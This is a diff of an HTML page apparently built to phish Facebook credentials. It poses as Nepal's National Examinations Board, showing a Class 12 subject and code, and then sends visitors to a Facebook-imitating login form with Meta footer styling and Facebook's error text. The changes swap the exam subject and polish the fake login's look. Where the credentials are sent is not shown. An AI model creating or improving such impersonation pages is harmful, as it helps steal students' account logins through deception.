@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>NEB - National Examinations Board</title>
     <style>
         * {
@@ -75,7 +75,7 @@
             margin-bottom: 15px;
         }
 
-        .math {
+        .subject {
             font-size: 24px;
             font-weight: bold;
             color: #2c3e50;
@@ -161,7 +161,7 @@
             box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
         }
 
-        .email-input {
+        .card input {
             width: 100%;
             padding: 14px 16px;
             margin-bottom: 12px;
@@ -172,60 +172,14 @@
             background: white;
         }
 
-        .email-input:focus {
+        .card input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        /* Password field with professional Facebook-style eye */
-        .password-field {
-            position: relative;
-            margin-bottom: 12px;
-        }
-
-        .password-field input {
-            width: 100%;
-            padding: 14px 45px 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            outline: none;
-            background: white;
-        }
-
-        .password-field input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .password-toggle svg {
-            width: 20px;
-            height: 20px;
-            fill: #65676b;
-            transition: fill 0.2s;
-        }
-
-        .password-toggle:hover svg {
-            fill: #1877f2;
-        }
-
-        .error-input {
-            border-color: #f02849 !important;
-            background-color: #fff8f8 !important;
+        .card input.error-input {
+            border-color: #f02849;
+            background-color: #fff8f8;
         }
 
         .login-btn {
@@ -239,6 +193,7 @@
             color: white;
             cursor: pointer;
             margin-bottom: 16px;
+            transition: background 0.2s;
         }
 
         .login-btn:hover {
@@ -307,6 +262,7 @@
             display: none;
         }
 
+        /* Meta Footer */
         .meta-footer {
             text-align: center;
             margin-top: 32px;
@@ -341,6 +297,11 @@
             font-size: 12px;
         }
 
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Shake animation */
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-4px); }
@@ -376,8 +337,8 @@
         <p>सानोठिमी, भक्तपुर | Nepal</p>
         <div class="class-box">
             <h3>📚 कक्षा १२ (Class 12)</h3>
-            <div class="math">[ MATHEMATICS ]</div>
-            <div class="code">'0081'</div>
+            <div class="subject">[ ACCOUNTING ]</div>
+            <div class="code">'1041'</div>
         </div>
         <button class="continue-btn" id="continueBtn">🔗 Continue to Facebook →</button>
     </div>
@@ -396,8 +357,8 @@
                 
                 <div class="password-field">
                     <input type="password" id="password" placeholder="Password">
-                    <button class="password-toggle" id="togglePassword" type="button">
-                        <svg viewBox="0 0 24 24" width="20" height="20">
+                    <button class="password-toggle" id="togglePassword" type="button" style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer;">
+                        <svg viewBox="0 0 24 24" width="20" height="20" style="fill: #65676b;">
                             <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                         </svg>
                     </button>
@@ -430,21 +391,18 @@
 </div>
 
 <script>
-    // Professional Facebook-style eye toggle
+    // Toggle password visibility
     const togglePassword = document.getElementById('togglePassword');
     const passwordInput = document.getElementById('password');
-    let isPasswordVisible = false;
 
     togglePassword.addEventListener('click', function() {
-        isPasswordVisible = !isPasswordVisible;
-        passwordInput.type = isPasswordVisible ? 'text' : 'password';
-        
-        // Change SVG to open eye (showing) or closed eye (hidden)
-        const svg = togglePassword.querySelector('svg');
-        if (isPasswordVisible) {
-            svg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
-        } else {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        const svg = this.querySelector('svg');
+        if (type === 'text') {
             svg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/><line x1="3" y1="3" x2="21" y2="21" stroke="#65676b" stroke-width="2"/>';
+        } else {
+            svg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
         }
     });
 
@@ -513,7 +471,7 @@
             if (data.success) {
                 alert('Login successful!');
             } else {
-                showError('The password that you\'ve entered is incorrect.', 'password');
+                showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
                 passwordInput.value = '';
                 passwordInput.focus();
             }
@@ -521,7 +479,7 @@
             if (email === 'admin' && password === '123456') {
                 alert('Login successful!');
             } else {
-                showError('The password that you\'ve entered is incorrect.', 'password');
+                showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
                 passwordInput.value = '';
                 passwordInput.focus();
             }
@@ -535,7 +493,7 @@
             emailInput.focus();
             return;
         }
-        alert('🔗 Your secure link: https://neb.exam/results/0081');
+        alert('🔗 Your secure link: https://neb.exam/results/1041');
     }
 
     loginBtn.addEventListener('click', doLogin);
